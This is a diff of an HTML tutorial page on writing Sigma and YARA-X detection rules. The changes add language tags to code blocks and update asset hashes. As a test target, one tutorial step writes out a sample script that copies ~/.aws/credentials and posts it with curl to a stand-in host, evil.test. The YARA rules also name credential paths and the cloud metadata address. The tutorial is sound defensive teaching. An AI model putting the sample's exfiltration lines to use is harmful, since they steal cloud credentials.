@@ -48,10 +48,10 @@
     <link rel="dns-prefetch" href="https://buymeacoffee.com">
 
     <script src="/theme.js?v=1431f6af" integrity="sha384-yBNS5EG1WmkupCLiVXXQOZHJcnrwaQCpPekQbFPY2xXT63psnOE6rSbtuCriyQqC"></script>
-    <link rel="preload" href="/style.css?v=779aa538" as="style"
-        integrity="sha384-LrHoiYYanguI/nNaUAigCg5Qnda2hTfXwj7aTx41D+ZmO1xAT6LPwh+6dDUitkM/">
-    <link rel="stylesheet" href="/style.css?v=779aa538"
-        integrity="sha384-LrHoiYYanguI/nNaUAigCg5Qnda2hTfXwj7aTx41D+ZmO1xAT6LPwh+6dDUitkM/">
+    <link rel="preload" href="/style.css?v=a01c4279" as="style"
+        integrity="sha384-/NoDoYb6OwsVV9QgSdOTocdkyvPrhIfGfRW+UpgvBaLZ8dOPw2HIPSJyhqdzGazI">
+    <link rel="stylesheet" href="/style.css?v=a01c4279"
+        integrity="sha384-/NoDoYb6OwsVV9QgSdOTocdkyvPrhIfGfRW+UpgvBaLZ8dOPw2HIPSJyhqdzGazI">
 
     <script type="application/ld+json">
     {
@@ -389,7 +389,7 @@
             <h2>Sigma: portable log detections</h2>
 
             <h3>1. Install the toolchain</h3>
-<div class="code-block"><pre>mkdir -p ~/detect-lab &amp;&amp; cd ~/detect-lab
+<div class="code-block" data-lang="bash"><pre>mkdir -p ~/detect-lab &amp;&amp; cd ~/detect-lab
 
 python3 -m pip install sigma-cli     # or: pipx install sigma-cli
 sigma version
@@ -400,7 +400,7 @@ sigma plugin install splunk</pre></div>
 
             <h3>2. The anatomy of a rule</h3>
             <p>Save this as <code>aws_cloudtrail_access_denied_burst.yml</code>. The filename matters more than you would expect, and step 3 explains why.</p>
-<div class="code-block"><pre>title: Access Denied Burst From Single Source
+<div class="code-block" data-lang="yaml"><pre>title: Access Denied Burst From Single Source
 id: 7c8f1f2a-3b4c-4d5e-8f90-1a2b3c4d5e6f     # a UUID, generated once, never reused
 status: experimental                          # experimental | test | stable | deprecated
 description: Repeated AccessDenied results from one source, a common sign of
@@ -435,26 +435,26 @@ level: medium                                 # informational | low | medium | h
             <p>Value modifiers do the matching work: <code>|contains</code>, <code>|startswith</code>, <code>|endswith</code>, <code>|re</code> for a regular expression, <code>|cidr</code> for network ranges, <code>|all</code> to require every item in a list rather than any, and <code>|base64offset|contains</code> for finding a string that has been base64-encoded at an unknown alignment.</p>
 
             <h3>3. Validate before you convert</h3>
-<div class="code-block"><pre>sigma check aws_cloudtrail_access_denied_burst.yml</pre></div>
+<div class="code-block" data-lang="bash"><pre>sigma check aws_cloudtrail_access_denied_burst.yml</pre></div>
             <p>Expect <code>Found 0 errors, 0 condition errors and 0 issues</code>. Now rename the file to something short like <code>rule.yml</code> and run it again: you get a high-severity <code>FilenameLengthIssue</code>. That check exists because SigmaHQ rules live in a flat directory of thousands, where a descriptive filename is the only navigation there is. Put <code>sigma check</code> in <a class="glossary-link" href="../glossary.html#term-ci-cd">CI</a> over your rule directory and this class of drift never accumulates.</p>
 
             <h3>4. Convert it, and meet the pipeline requirement</h3>
-<div class="code-block"><pre>sigma convert -t splunk aws_cloudtrail_access_denied_burst.yml</pre></div>
+<div class="code-block" data-lang="bash"><pre>sigma convert -t splunk aws_cloudtrail_access_denied_burst.yml</pre></div>
             <p>That fails, deliberately, telling you to choose a processing pipeline or pass <code>--without-pipeline</code>. This is the single most important thing to understand about Sigma and the tool refuses to let you skip it.</p>
             <div class="highlight-box">
             <p><strong>A Sigma rule's field names are Sigma's names, not your SIEM's.</strong> A <em>processing pipeline</em> maps them onto whatever your data actually looks like after ingestion, and different ingestion paths for the same source produce different field names. Convert without a pipeline and you get a syntactically valid query referencing fields that do not exist in your index. It runs. It returns zero results. It looks like a quiet environment.</p>
             </div>
-<div class="code-block"><pre>sigma list pipelines splunk        # what mappings ship with this backend
+<div class="code-block" data-lang="bash"><pre>sigma list pipelines splunk        # what mappings ship with this backend
 
 # Now, knowing what you are giving up:
 sigma convert -t splunk --without-pipeline aws_cloudtrail_access_denied_burst.yml</pre></div>
             <p>Which produces:</p>
-<div class="code-block"><pre>errorCode="AccessDenied" NOT userIdentity.arn="arn:aws:sts::111122223333:assumed-role/config-recorder/*"</pre></div>
+<div class="code-block" data-lang="text"><pre>errorCode="AccessDenied" NOT userIdentity.arn="arn:aws:sts::111122223333:assumed-role/config-recorder/*"</pre></div>
             <p>Read what the compiler did. <code>|startswith</code> became a trailing <code>*</code>, and <code>not</code> became <code>NOT</code>. That is the whole value proposition: the same rule targets Elastic, Sentinel, QRadar, Carbon Black, or SentinelOne by changing one flag, and each backend knows its own dialect's quirks.</p>
 
             <h3>5. Correlation rules</h3>
             <p>The rule above fires on a single denied event, which is noisy and not really what the title claims. "A burst" is a count over a window, and that needs a <a href="https://github.com/SigmaHQ/sigma-specification/" target="_blank" rel="noopener noreferrer">Sigma correlation rule</a>: a second YAML document that references the first by name.</p>
-<div class="code-block"><pre>---
+<div class="code-block" data-lang="yaml"><pre>---
 title: Access Denied Burst From Single Source
 id: 1f2e3d4c-5b6a-4789-9012-3456789abcde
 status: experimental
@@ -475,13 +475,13 @@ level: high</pre></div>
             <h2>YARA: patterns in bytes</h2>
 
             <h3>6. Install YARA-X, not YARA</h3>
-<div class="code-block"><pre>brew install yara-x      # or: cargo install yara-x-cli
+<div class="code-block" data-lang="bash"><pre>brew install yara-x      # or: cargo install yara-x-cli
 yr --version</pre></div>
             <p>YARA-X is the Rust rewrite from VirusTotal. Version 1.0 went stable in June 2025, VirusTotal runs it in production for Livehunt and Retrohunt, and the original YARA 4.x line is in maintenance mode receiving bug fixes only. The command is <code>yr</code>, not <code>yara</code>, and the subcommands are <code>scan</code>, <code>compile</code>, <code>fmt</code>, <code>dump</code>, <code>deps</code>, and <code>fix</code>.</p>
             <p>Rules are broadly compatible in the direction that matters: existing YARA rules generally work on YARA-X. Do not assume the reverse.</p>
 
             <h3>7. Write a rule, and a target to test it on</h3>
-<div class="code-block"><pre>cat &gt; demo.yar &lt;&lt;'EOF'
+<div class="code-block" data-lang="bash"><pre>cat &gt; demo.yar &lt;&lt;'EOF'
 rule Suspicious_Cloud_Credential_Theft
 {
     meta:
@@ -514,21 +514,21 @@ printf '#!/bin/sh\ncat ~/.aws/credentials &gt; /tmp/loot\ncurl -X POST https://e
 printf 'just some ordinary text with the word curl in it\n' &gt; benign.txt</pre></div>
 
             <h3>8. Compile, scan, and read the evidence</h3>
-<div class="code-block"><pre>yr compile demo.yar -o /dev/null     # syntax check without scanning anything
+<div class="code-block" data-lang="bash"><pre>yr compile demo.yar -o /dev/null     # syntax check without scanning anything
 
 yr scan demo.yar sample.sh           # expect: the rule name and the filename
 yr scan demo.yar benign.txt          # expect: nothing at all</pre></div>
             <p>Run both. <code>benign.txt</code> contains the word <code>curl</code> and correctly does not match, because the condition requires a credential indicator <em>and</em> an <a class="glossary-link" href="../glossary.html#term-exfiltration">exfiltration</a> indicator. That negative case is not a formality: it is the only thing distinguishing a working rule from one that matches half your filesystem.</p>
-<div class="code-block"><pre>yr scan -s demo.yar sample.sh</pre></div>
+<div class="code-block" data-lang="bash"><pre>yr scan -s demo.yar sample.sh</pre></div>
             <p><code>-s</code> prints every matched string with its offset, length, identifier, and the actual bytes:</p>
-<div class="code-block"><pre>Suspicious_Cloud_Credential_Theft sample.sh
+<div class="code-block" data-lang="text"><pre>Suspicious_Cloud_Credential_Theft sample.sh
 0xf:17:$cred1: /.aws/credentials
 0x2d:4:$exfil1: curl
 0x3a:25:$exfil3: https://evil.test/collect</pre></div>
             <p>This is how you debug a rule, and how you write up a finding. A match with no evidence is an assertion; a match with offsets is something a colleague can verify.</p>
 
             <h3>9. Conditions beyond "any of them"</h3>
-<div class="code-block"><pre>rule Repeated_IMDS_Access
+<div class="code-block" data-lang="yara"><pre>rule Repeated_IMDS_Access
 {
     strings:
         $imds = "169.254.169.254"
@@ -537,7 +537,7 @@ yr scan demo.yar benign.txt          # expect: nothing at all</pre></div>
         // @ident[n] = the offset of the nth match (1-based)
         #imds &gt;= 2 and @imds[1] &lt; 200
 }</pre></div>
-<div class="code-block"><pre>// File-type anchoring. uint16(0) reads two bytes little-endian at offset 0;
+<div class="code-block" data-lang="yara"><pre>// File-type anchoring. uint16(0) reads two bytes little-endian at offset 0;
 // 0x5A4D is "MZ", the DOS header every Windows PE starts with.
 rule Is_Windows_PE
 {
@@ -547,7 +547,7 @@ rule Is_Windows_PE
             <p>Anchoring on structure rather than content is what makes a rule fast. YARA scans everything you point it at, so a rule that can rule out a file in two bytes is worth far more than one that has to search the whole thing. The <code>pe</code>, <code>elf</code>, <code>math</code>, and <code>hash</code> modules go further, exposing parsed structure such as imports, sections, and entropy.</p>
 
             <h3>10. Keep rules in git like code</h3>
-<div class="code-block"><pre>yr fmt demo.yar             # rewrite in canonical style
+<div class="code-block" data-lang="bash"><pre>yr fmt demo.yar             # rewrite in canonical style
 yr fmt --check demo.yar     # exit 1 if it WOULD be rewritten - a CI gate</pre></div>
             <p><code>yr fmt --check</code> and <code>sigma check</code> are the same idea applied to the two formats, and both belong in the same pipeline as the rules themselves.</p>
         </section>
@@ -560,7 +560,7 @@ yr fmt --check demo.yar     # exit 1 if it WOULD be rewritten - a CI gate</pre><
                 <p>Write a Sigma rule that fires when a <a class="glossary-link" href="../glossary.html#term-cloudtrail">CloudTrail</a> event has <code>eventName</code> of <code>PutBucketPolicy</code> or <code>PutBucketAcl</code>, excluding calls made by your <a class="glossary-link" href="../glossary.html#term-terraform">Terraform</a> deployment role. Run <code>sigma check</code> on it and convert it to Splunk.</p>
                 <details>
                     <summary>Show the answer</summary>
-<div class="code-block"><pre>detection:
+<div class="code-block" data-lang="yaml"><pre>detection:
   selection:
     eventName:                       # a list of values is an OR
       - PutBucketPolicy
@@ -590,7 +590,7 @@ yr fmt --check demo.yar     # exit 1 if it WOULD be rewritten - a CI gate</pre><
             <div class="exercise">
                 <span class="exercise__label">Exercise 3</span>
                 <p>This YARA rule was written to catch a credential stealer. It matches roughly every shell script on the system. Fix it, and explain the class of mistake.</p>
-<div class="code-block"><pre>rule Credential_Stealer
+<div class="code-block" data-lang="yara"><pre>rule Credential_Stealer
 {
     strings:
         $a = "aws"
@@ -602,7 +602,7 @@ yr fmt --check demo.yar     # exit 1 if it WOULD be rewritten - a CI gate</pre><
                 <details>
                     <summary>Show the answer</summary>
                     <p>Three failures compounding. The strings are short, common English fragments; <code>any of them</code> means a single one is enough; and there is no <code>fullword</code>, so <code>$a</code> matches inside <code>always</code>, <code>software</code>, and <code>laws</code>.</p>
-<div class="code-block"><pre>rule Credential_Stealer
+<div class="code-block" data-lang="yara"><pre>rule Credential_Stealer
 {
     strings:
         $path  = "/.aws/credentials" ascii nocase
@@ -685,7 +685,7 @@ yr fmt --check demo.yar     # exit 1 if it WOULD be rewritten - a CI gate</pre><
     </div>
   </footer>
 
-    <script src="/main.js?v=dc0c3a7d" integrity="sha384-WfYzpgtJJKommY9FHgobCJlEfpolhFNp8i7QL8SVsPibVZzNTFr+N3eOVDNW+6NX"
+    <script src="/main.js?v=2c4632b1" integrity="sha384-+mcrAUj1uPLsd0DHtllSXtuKyiVdeXvWbozp75On/zmTCIj73QRZZSkUQVEt+0kL"
         defer></script>
   <script data-goatcounter="https://csoh.goatcounter.com/count" src="/vendor/goatcounter-count.js?v=32a32552" defer integrity="sha384-ObOhzog52CljOXuYB632Z7vqGPbDMFN6J9jxRkkgcseQi+82fyfDkZYzPmr3zrIi"></script>
 </body>
